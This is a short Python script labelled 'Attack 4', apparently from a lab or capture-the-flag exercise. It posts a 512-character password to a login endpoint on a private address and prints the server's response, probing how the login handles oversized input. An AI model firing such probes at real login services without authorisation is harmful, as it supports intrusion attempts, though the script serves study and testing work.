# The Python script for Attack 4

import json
import requests

url = "http://10.13.13.254/login"

data = {
    'password': "1"*512
}

# Send the POST request
response = requests.post(url, json=data, allow_redirects=False)

# Check the status code
if response.status_code != 200:
    print(f'Request failed with status code {response.status_code}')
    if response.is_redirect:
        print("Tried to redirect to: " + response.headers["Location"])
    exit(1)

json_response = response.json()
if "error" in json_response:
    print("There was an error: " + json_response["error"])
    exit(1)

print(json.dumps(json_response, ensure_ascii=False, indent=4))
